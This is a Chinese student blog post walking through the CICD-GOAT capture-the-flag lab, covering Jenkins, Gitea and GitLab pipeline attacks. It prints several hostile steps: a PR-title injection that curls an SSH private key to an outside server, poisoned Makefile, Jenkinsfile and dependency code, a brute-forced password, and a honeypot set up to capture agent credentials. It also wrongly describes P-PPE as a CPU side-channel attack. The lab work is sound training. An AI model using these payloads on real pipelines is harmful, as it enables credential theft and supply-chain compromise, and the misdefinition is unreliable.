---
title: "云安全：CICD靶场实操"
date: 2024-12-11T07:34:52.000Z
lastmod: 2024-12-11T09:04:37.061Z
draft: false
author: "Tardfyou"
description: "学校的云安全攻防课程结课了，大作业是从CICD-GOAT靶场找flag。本次拿下了靶场热门的11个flag，再次记录详细过程，以便后续学习。"
summary: "学校的云安全攻防课程结课了，大作业是从CICD-GOAT靶场找flag。本次拿下了靶场热门的11个flag，再次记录详细过程，以便后续学习。"
slug: "云安全：CICD靶场实操"
aliases:
  - "/2024/12/11/云安全：CICD靶场实操/"
tags:
  - "learning"
categories:
  - "Cloud Security"
images:
  - "https://external-preview.redd.it/e1vPmXFtQrlXfTyvRJ-J7CqaRWOVljVLAJtPcRxeR2c.jpg?auto=webp&s=2a7bd02c4ee80268eb5a7f6e52b4080b5504a458"
lightgallery: true
---

<blockquote>
<p>针对实操项目，发现了11个flag（文中将详细给出解题流程和遇到的问题），分别如下：</p>

<!--more-->
</blockquote>
<h2 id="第一项：实操部分"><strong>第一项：实操部分</strong></h2><h3 id="准备、环境搭建和配置"><code> </code><strong>准备、环境搭建和配置</strong></h3><p>对于本次云安全cicd-goat靶场实验，最开始选用ubuntu18.04虚拟机进行实验，后续进行中发现，容器启动会会出现极其卡顿的现象，以及无法访问gitlab。于是更换ubuntu22.04分配8G内存解决卡顿问题，通过配置代理解决gitlab无法访问的问题。按照官网完成了安装工作。<br><img src="/images/cloud/1.png" /><br>然后就是各个站点登陆账密。</p>

<pre><code class="language-plaintext">Jenkins：http://localhost:8080
Username: alice
Password: alice
Gitea：http://localhost:3000
Username: thealice
Password: thealice
GitLab http://localhost:4000
Username: alice
Password: ali12345 //已经改了，教程里还没更新

CTFd
Username: admin
Password: ciderland5#
Jenkins
Username: admin
Password: ciderland5#
Gitea
Username: red\_queen
Password: ciderland5#
Gitlab
Username:root
Password:ciderland5#</code></pre>

<h3 id="一、PPE类型漏洞"><strong>一、PPE类型漏洞</strong></h3><p>下面结合所做的几道PPE类型漏洞题目进行讲解。</p>
<p>首先对PPE漏洞的内容进行了自学了解。PPE漏洞是一种与预处理环境相关的安全漏洞，主要出现在处理数据或配置文件时，系统对输入未充分验证，导致攻击者可以以特定方式操控输入。通常发生在程序预处理阶段如读取配置文件、处理模板、构建命令行等。在本次靶场实操当中，预处理阶段，主要发生在项目重新build的过程中。这类风险通常在代码仓库中，可控对应CI管道配置文件，修改CI配置文件达到执行命令目的。如Jenkinsfile，.gitlab-ci.yml，.circleci/config.tml，以及位于.github/workflows下的Github Actions YAML文件。当黑客提交修改申请的时候，管理员配置好的WebHook就会触发对应配置文件，从而执行配置文件中定义的流水线。</p>
<p>而PPE风险具体有三种主要类型组成：</p>
<ul>
<li>Direct(D-PPE)：在 D-PPE 场景中，攻击者修改他们有权访问的代码仓库中的 CI 配置文件（如Jenkins的Jenkinsfile文件），通过直接将更改推送到代码仓库上未受保护的远程分支。由于 CI 管道执行是由“push”或“PR”事件触发WebHook的，并且管道执行的命令是由修改后的 CI 配置文件中的内容定义的，一旦构建管道被恶意篡改，攻击者的恶意命令最终是会在构建节点中运行、触发。</li>
<li>Indirect(I-PPE)：如果CI的流水线定义不是在代码仓库中的配置文件定义，而是在CI系统（Jenkins）自身定义的。仍然可以通过代码仓库中存在的文件进行恶意代码执行，如Makefile文件、管道中自定义执行的shell脚本。通过间接插入恶意代码到管道中执行的脚本，达到恶意代码植入。</li>
<li>Public(P-PPE,or 3PE)：从公共的代码仓库拉取的代码，如果攻击者通过公共仓库进行投毒，会对CI系统造成破坏，如果CI系统在内网，甚至可能进一步危害内网安全。现在再来看看该题目的解题过程，Jenkins针对该题目有个对应的CI管道，会轮询Gitea地址上的项目，这里需要在Jenkins的系统配置里面改动下目标地址。</li>
</ul>
<h4 id="1、PPE类型漏洞发现入口"><strong>1、PPE类型漏洞发现入口</strong></h4><p>在 <strong>Jenkins</strong> 中，管道（Pipeline）是实现持续集成和持续交付的核心工具，用于定义构建、测试和部署的全过程。管道以脚本形式配置，可以高度灵活地处理任务。然而，这种灵活性也使得 Jenkins 管道容易受到 <strong>PPE 漏洞</strong> 的威胁。Jenkins支持声明形式的直观的管道和基于Groovy的完整脚本语言，管道脚本会运行这Jenkins的执行环境中，并且能够访问节点，工作空间，环境变量等资源，为执行任务提供遍历，但也可能成为漏洞利用的源头。如对于Jenkinsfile，可能未检查用户输入直接执行系统命令，或者控制环境变量内容，动态执行攻击者提供的恶意Groovy脚本，导致敏感文件泄露或任意文件操作等问题。<br><img src="/images/cloud/2.png" /></p>
<h4 id="2、PPE类型漏洞利用过程"><strong>2、PPE类型漏洞利用过程</strong></h4><p>下面结合所找的flag具体介绍利用漏洞的过程。</p>
<h5 id="White-Rabbit"><strong>White Rabbit</strong></h5><p>访问项目对应的gieta仓库，直接ls发现存在Jenkinsfile文件，clone下来尝试注入恶意代码。<br><img src="/images/cloud/3.png" /><br>然后创建新分支，推送到仓库中并创建pull request。</p>

<pre><code class="language-bash">git checkout -b task1 //创建且切换到新分支
git add \* 
git commit -m "first flag"
git push -u origin task1 //提交到新分支</code></pre>

<p><img src="/images/cloud/4.png" /><br>去Jenkins中查看pipeline构建过程。<br><img src="/images/cloud/5.png" /><br>成功获得flag。<br><img src="/images/cloud/6.png" /></p>
<h5 id="Mad-Hatter"><strong>Mad Hatter</strong></h5><p>Mad Hatter有两个仓库，一个仓库存储代码，另一个存储pipeline配置文件，对于配置文件所在仓库没法直接git push，因此就是PPE漏洞的变种，间接PPE。综上来看，需要修改makefile来输出flag，运行的Jenkinsfile是独立仓库无权修改CI管道配置文件，考点是I-PPE。</p>
<p>对makefile文件进行修改：<br><img src="/images/cloud/7.png" /></p>

<pre><code class="language-makefile">whoami:
    echo $FLAG|base64</code></pre>

<p>重复之前的操作<br><img src="/images/cloud/8.png" /></p>
<p>发现有问题。<br><img src="/images/cloud/9.png" /></p>
<p>发现其他网上的文档里没有提到这个问题，发现是需要将变量括起来。<br><img src="/images/cloud/10.png" /><br><img src="/images/cloud/11.png" /></p>
<h5 id="Caterpillar"><strong>Caterpillar</strong></h5><p>此题不同于之前的PPE题目，先从结果开始分析，在Jenkins中发现有两个该项目的job，一个是test一个是prod。对于test，查看配置发现如果forks的项目发起了对main的pr就会触发pipeline并且信任所有人，相当于public-ppe。对于prod的配置，第一个是不含pr的分支，第二个是pr的分支。于是fork下来项目，clone fork的项目后修改配置文件读取env。考虑题目三个提示：分叉存储库，执行恶意代码后依赖环境变量继续前进，管道中找到gitea访问令牌。<br><img src="/images/cloud/12.png" /><br>老步骤提交，并且创建pr读取到env获得原仓库内容。于是clone原仓库。</p>

<pre><code class="language-bash">git clone http://5d3ed5564341d5060c8524c41fe03507e296ca46@192.168.249.131:3000/Wonderland/caterpillar.git</code></pre>

<p>该令牌具备写权限，于是修改配置文件，老步骤操作。<br><img src="/images/cloud/13.png" /><br>拿到flag：<br><img src="/images/cloud/14.png" /><br>test管道没有我们需要的flag2凭据，但是在prod中存在，而触发prod需要通过分支合并才能执行，所以需要通过第一个test管道获取仓库token，创建分支再获取flag2.</p>
<h5 id="Cheshire-Cat"><strong>Cheshire Cat</strong></h5><p>查看题目提示：All jobs in your victim’s Jenkins instance run on dedicated nodes, but that’s not good enough for you，尝试执行D-PPE攻击，尝试找到控制器标签，搞清楚Jenkinsfile如何指示运行作业。也就是需要指定node来执行，一般执行是在agent1上，所以需要指定执行到另一个node也就是仅剩的built-in，其label是built-in。</p>
<p>clone下来后修改Jenkinsfile：<br><img src="/images/cloud/15.png" /><br>指定agent是built-in，从文件系统里读取flag。<br>同样的流程操作以及创建pr，查看console output即可。<br><img src="/images/cloud/16.png" /></p>
<h5 id="Mock-Turtle"><strong>Mock Turtle</strong></h5><p>Jenkins代码涉及三层判断，分别是检查增加的单词数和减少的单词数必须相同，判断version文件是否一行且满足x.y.z搁置，判断pr中是否修改了version，满足则merge。</p>
<p>于是修改Jenkinsfile，version，以及readme.md以满足三个条件。<br><img src="/images/cloud/17.png" /></p>
<p>创建pr，查看发现自动合并，再查看main中再次触发的管道。拿到flag。</p>
<h4 id="3、PPE类型漏洞利用结果"><strong>3、PPE类型漏洞利用结果</strong></h4><h5 id="White-rabbit"><strong>White rabbit</strong></h5><p>对base64解码即可拿到实际内容。<br><img src="/images/cloud/40.png" /><br><code>flag1:.06165DF2-C047-4402-8CAB-1C8EC526C115.</code></p>
<h5 id="Mad-Hatter-1"><strong>Mad Hatter</strong></h5><p><code>base64解码后flag2：ACD6E6B8-3584-4F43-AB9C-ACD080B8EBB2</code></p>
<h5 id="Caterpillar-1"><strong>Caterpillar</strong></h5><p><code>Decode: AEB14966-FFC2-4FB0-BF45-CD903B3535DA</code></p>
<h5 id="Cheshire-Cat-1"><strong>Cheshire Cat</strong></h5><p><code>Decode: 6B31A679-6D70-469D-9F8D-6D6E80B3C29C</code></p>
<h5 id="Mock-Turtle-1"><strong>Mock Turtle</strong></h5><p><img src="/images/cloud/18.png" /></p>
<h3 id="二、代码库敏感信息泄露漏洞"><strong>二、代码库敏感信息泄露漏洞</strong></h3><h4 id="1、漏洞发现入口"><strong>1、漏洞发现入口</strong></h4><p><strong>Gitleaks</strong> 是一个开源工具，主要用于扫描代码库中的敏感信息泄露漏洞。它能够快速检测 Git 仓库中可能包含的机密数据，例如 API 密钥、访问令牌、密码、私钥等。这些敏感信息一旦泄露，可能被攻击者利用，从而对系统的安全性造成严重威胁。Gitleaks针对的主要漏洞类别有API密钥和访问令牌泄露。私钥或证书泄露，用户名和密码泄露。配置文件和环境变量泄露。敏感文件路径暴露和外部服务凭据。未授权的配置或调试信息。</p>
<p>Gitleaks的功能特点就是提供了一组预定义规则，可以检测多种常见敏感信息类型，如AWS密钥，JWT，OAuth令牌等。支持本地，远程，增量扫描。</p>
<h4 id="2、漏洞利用过程"><strong>2、漏洞利用过程</strong></h4><h5 id="Duchess"><strong>Duchess</strong></h5><p>首先查看描述，发现存储库中存在Pypi token（是 Python Package Index（PyPI）提供的一种身份验证方式，用于开发者在发布或管理 Python 包时验证其身份。它是一种访问令牌（Access Token），可以替代传统的用户名和密码登录方式，提供更安全、更便捷的认证手段），于是考虑到是存储库代码的信息收集。安装配置gitleak，设置环境变量（不详细介绍了），然后将检测结果导出到output.json。综合来看，考点是CICD-SEC-6凭证安全。<code>gitleaks detect -s . -r output.json</code><br><img src="/images/cloud/19.png" /><br>查看输出，匹配字符串PyPI拿到flag。<br><img src="/images/cloud/20.png" /></p>
<h4 id="3、漏洞利用结果"><strong>3、漏洞利用结果</strong></h4><h5 id="Duchess-1"><strong>Duchess</strong></h5><p><code>pypi-AgEIcHlwaS5vcmcCJGNmNTI5MjkyLWYxYWMtNDEwYS04OTBjLWE4YzNjNGY1ZTBiZAACJXsicGVybWlzc2lvbnMiOiAidXNlciIsICJ2ZXJzaW9uIjogMX0AAAYg7T5yHIewxGoh-3st7anbMSCoGhb-U3HnzHAFLHBLNBY</code></p>
<h3 id="三、依赖项投毒漏洞"><strong>三、依赖项投毒漏洞</strong></h3><h4 id="1、漏洞发现入口-1"><strong>1、漏洞发现入口</strong></h4><p>不再是直接修改Jenkinsfile文件，更多的需要审计其它源码，会出现多个仓库之间的联动，需要理解仓库之间的可控与不可控关系，结合其它文件进行利用。</p>
<h4 id="2、漏洞利用过程-1"><strong>2、漏洞利用过程</strong></h4><h5 id="Twiddledum"><strong>Twiddledum</strong></h5><p>目标是一个文件夹，gitea上存在两个仓库，分别是dee和dum后缀，尝试在Jenkins build dum，发现pipeline中执行了node index.js,其中require dee，考虑到dum不可控，dee可控，尝试往dee中注入恶意代码。先clone下来dee修改index.js。考点是管道项目的依赖项目可能存在供应链攻击，给dee依赖投毒，导致管道仓库dum也执行相关命令。<br><img src="/images/cloud/21.png" /><br>直接往main分支push。</p>
<p>审计dum的package.json:<br><img src="/images/cloud/22.png" /><br>其通过字下载twiddledee的tag为1.1.0的源码来更新，因此需要删除目前的1.1.0版本，重新以不同版本号发布。<br><img src="/images/cloud/23.png" /><br>重新build即可获得flag。</p>
<p>参考文档，push的时候打上新的flag也是可行的。</p>

<pre><code class="language-bash">git tag 1.2.0 HEAD
git push origin 1.2.0</code></pre>

<h4 id="3、漏洞利用结果-1"><strong>3、漏洞利用结果</strong></h4><h5 id="Twiddledum-1"><strong>Twiddledum</strong></h5><p><img src="/images/cloud/24.png" /></p>
<h3 id="四、扫描器劫持漏洞"><strong>四、扫描器劫持漏洞</strong></h3><h4 id="1、漏洞发现入口-2"><strong>1、漏洞发现入口</strong></h4><p>控制 SATA（Serial ATA）扫描器的漏洞，主要与扫描器的配置管理、输入验证和执行环境有关。如果 SATA 扫描器通过配置文件控制其行为（如扫描参数、目标范围、规则设置等），配置文件的不当设计或保护不足可能会导致以下安全问题：配置文件注入，配置文件路径遍历，未经授权的配置修改，敏感数据暴露，动态加载配置的命令执行。</p>
<p>阅读Checkov，管道中引入了SATA静态扫描工具。介绍了其会读取仓库中配置文件作为运行配置，可以劫持checkov的配置。</p>
<h4 id="2、漏洞利用过程-2"><strong>2、漏洞利用过程</strong></h4><h5 id="Dodo"><strong>Dodo</strong></h5><p>创建一个.checkov.yml</p>

<pre><code class="language-yaml">soft-fail: true
check:
    - THIS\_NOT\_THE\_CHECK\_YOUR\_ARE\_LOOKING\_FOR</code></pre>

<p>修改main.tf中对应位置acl为public-read：<br><img src="/images/cloud/25.png" /><br>再次build即可绕过检测拿到flag。</p>
<h4 id="3、漏洞利用结果-2"><strong>3、漏洞利用结果</strong></h4><h5 id="Dodo-1"><strong>Dodo</strong></h5><p>重新build即可拿到flag，不再赘述。</p>
<h3 id="五、弱口令和节点漏洞"><strong>五、弱口令和节点漏洞</strong></h3><h4 id="1、漏洞发现入口-3"><strong>1、漏洞发现入口</strong></h4><p>在遇到题目heart的时候，发现people下面有很多的用户，其中Knave是agent的admin。根据提示需要暴力破解，以及搭建蜜罐获取对应flag。</p>
<h4 id="2、漏洞利用过程-3"><strong>2、漏洞利用过程</strong></h4><h5 id="Hearts"><strong>Hearts</strong></h5><p>首先对Knave账户密码进行弱口令爆破，拿到密码。<br><code>    knave:rockme</code><br>之后创建新的node，设置其host和Credentials为自己的服务器和agent的credentials，ssh发送到自己的蜜罐上获得flag。</p>
<p>创建蜜罐使用下面的指令：</p>

<pre><code class="language-bash">docker run -p 2222:2222 cowrie/cowrie
#设置端口转发
echo 1 &gt; /proc/sys/net/ipv4/ip\_forward
iptables -P FORWARD ACCEPT
iptables -A INPUT -p tcp --dport 2222 -j ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-ports 2222

#蜜罐使用完之后将转发的规则删除，要删干净。
iptables -L INPUT --line-numbers
iptables -D INPUT 7
iptables -t nat -L -n --line-numbers
iptables -t nat -D PREROUTING 2</code></pre>

<p><img src="/images/cloud/26.png" /><br>然后创建新节点。<br><img src="/images/cloud/27.png" /><br>save后机器启动，蜜罐收到flag。</p>
<h4 id="3、漏洞利用结果-3"><strong>3、漏洞利用结果</strong></h4><h5 id="Hearts-1"><strong>Hearts</strong></h5><p><code>    flag：agent:B1A648E1-FD8B-4D66-8CAF-78114F55D396</code></p>
<h3 id="六、代码注入漏洞"><strong>六、代码注入漏洞</strong></h3><h4 id="1、漏洞发现入口-4"><strong>1、漏洞发现入口</strong></h4><p>对于题目Dormouse中的环境，gitea中dormouse不可控，其Jenkinsfile请求一远程sh文件后执行。<br><img src="/images/cloud/28.png" /><br>0177.0.0.01是八进制的127.0.0.1。clone下来该仓库文件。<br><img src="/images/cloud/29.png" /><br>查看其Jenkinsfile：<br><img src="/images/cloud/30.png" /><br>发现存在代码注入漏洞，其中会取pr的title拼到命令执行，也可以执行P-PPE攻击。</p>
<p>备注：<strong>P-PPE（Phantom-Property Pre-Execution）攻击</strong> 是一种针对现代处理器的推测执行（Speculative Execution）漏洞的攻击类型，主要通过利用处理器在执行程序时的推测机制，泄露系统中的敏感信息。它属于侧信道攻击（Side-Channel Attack）的范畴，与著名的 <strong>Spectre</strong> 和 <strong>Meltdown</strong> 漏洞有相似之处。</p>
<h4 id="2、漏洞利用过程-4"><strong>2、漏洞利用过程</strong></h4><h5 id="Dormouse"><strong>Dormouse</strong></h5><p>根据下面的代码：<br><img src="/images/cloud/31.png" /><br>执行的node上存在$KEY，是ssh的私钥，可以利用代码注入获取这个私钥，并通过scp传送reportcov.sh文件来把恶意的reportcov.sh文件传送过去，这样dormouse仓库build的时候就会执行我们的恶意代码。先把rep项目fork下来。随便修改以尝试注入。</p>

<pre><code class="language-bash">1  `echo "${KEY}" &gt; key &amp;&amp; curl -v -F file=@key http://http\_server\_ip:port`</code></pre>

<h4 id="3、漏洞利用结果-4"><strong>3、漏洞利用结果</strong></h4><h5 id="Dormouse-1"><strong>Dormouse</strong></h5><p>有服务器的话能收到key：<br><img src="/images/cloud/32.png" /><br>于是直接ssh登陆。<br><img src="/images/cloud/33.png" /><br>重新build拿到flag。</p>
<h3 id="七、pipeline构建恶意代码执行漏洞"><strong>七、pipeline构建恶意代码执行漏洞</strong></h3><h4 id="1、漏洞发现入口-5"><strong>1、漏洞发现入口</strong></h4><p>对于题目Gryphon，一共三个仓库，pygrphon，awesome-app的pipeline构建的时候调用恶意代码，flag11是nest-of-gold的环境变量。</p>
<p>查看nest-of-gold的pipeline中最后会build当前dockerfile并构建容器，flag11是容器环境变量，nest-of-gold的dockerfile中拉去的镜像是gitlab仓库当中的。可以利用通过awesome-app中pipeline执行我们注入的恶意代码，将恶意镜像推送到gitlab，污染image，拿到flag。</p>
<h4 id="2、漏洞利用过程-5"><strong>2、漏洞利用过程</strong></h4><h5 id="Gryphon"><strong>Gryphon</strong></h5><p>登陆gitlab，搜索flag11发现被引用。<br><img src="/images/cloud/34.png" /><br>修改greet.py:<br><img src="/images/cloud/35.png" /><br>执行后会获取flag命令来替代镜像中python3命令。官方在执行install requirements.txt的时候就会curl，这个时候flag还没有注入环境。之后build包先删除现有的。<br><img src="/images/cloud/36.png" /></p>

<pre><code class="language-bash">python3.10 -m build ./
python3.10 -m twine upload -r gitlab dist/\* --verbose</code></pre>

<p>执行前需要准备.pypirc文件。<br><img src="/images/cloud/37.png" /><br>password就填从gitlab创建的access token。<br><img src="/images/cloud/38.png" /><br>之后等项目每10分钟自动执行pipeline即可拿到flag。</p>
<p>awesome-app的pipeline会安装一些东西需要十几分钟的时间，nest-of-gold的pipeline会直接报错，这似乎是代码本身的问题，gitlab登root上去把这行pipeline删掉就行。</p>
<p>之后触发恶意代码，执行test_hello.py然后访问flash中的hello函数，触发恶意方法。</p>
<h4 id="3、漏洞利用结果-5"><strong>3、漏洞利用结果</strong></h4><h5 id="Gryphon-1"><strong>Gryphon</strong></h5><p><img src="/images/cloud/39.png" /><br>至此，靶场热门的11个flag全部拿到。</p>
<hr>
<h2 id="第二项：个人成长部分"><strong>第二项：个人成长部分</strong></h2><p>通过这两个月的课堂学习和 CICD-GOAT 靶场的实操练习，我对云安全的理解有了较大提升。目前，我已经掌握了云安全的基本概念，例如共享责任模型（Shared Responsibility Model）、零信任架构（Zero Trust Architecture）等，了解了云安全中关键的技术领域，包括身份与访问管理（IAM）、数据加密与密钥管理（KMS）、网络安全组（Security Group）、入侵检测与防御系统（IDS/IPS）以及docker使用等内容。此外，通过靶场的实践，我熟悉了常见的云安全攻击手法，如云环境中的未授权访问、权限提升、存储桶暴露、供应链攻击，PPE漏洞等等内容以及其相应的攻击手段和工具使用方式。</p>
<p>对于本次靶场实验，踩了很多坑：最开始会很卡，无法访问一些站点，需要换虚拟机型号。在拉取镜像的时候出现了经常一半卡住的问题，需要信号中断后重新反复拉取，更改了比较高质量的源也没有解决该问题。对于中间的build经常卡住需要重启jenkins-server，然后在搭建蜜罐的时候突然出现端口占用以及站点断连，通过重启虚拟机解决，还关闭了指定端口的容器。然后对于需要用到http服务器的几个flag题目，不得不想办法创建http服务，缺少外界相关支持，得自学着搭。还有就是站点交互界面缺少引导，自己摸索了一下如何pr，还有生成ac token。中间关闭靶场和启动有时候无法解决断连问题不得不重启。</p>
<p>然而，我也意识到自己的不足之处：在应对复杂云环境中多租户隔离问题、动态威胁检测、微服务架构下的安全设计，以及 DevSecOps 中如何高效集成安全工具链等方面，还没有理解和相关实践经验。对于 Kubernetes 集群的操作、API 网关的安全控制，以及基于事件响应的自动化安全处理流程仍有大量提升空间。</p>
<p>我的总结是：云安全不仅是技术的积累，更是对整体架构的全局性思考。现代云原生环境的复杂性和动态性要求我们具备扎实的理论基础，同时也要在实际攻防场景中不断提升自己的综合能力。随着越来越多的企业生产环境中都应用了CI/CD来部署。这也导致很多的攻击面暴露出来，因此需要更加注重管道的安全性。从本地开发环境到云端 CICD 流水线的每个环节，从基础设施即代码（IaC）的安全扫描到运行时的威胁检测，我们需要深刻理解各层面的安全风险及其应对措施。未来，我计划进一步加强领域的学习，并结合实际案例，提升安全策略的设计和实施能力。只有通过理论与实践的结合，持续关注云安全的最新技术趋势，才能真正掌握这个领域的核心能力。</p>
<p>署名：火之意志继承者</p>
<p>提交日期：2024年12月11日</p>
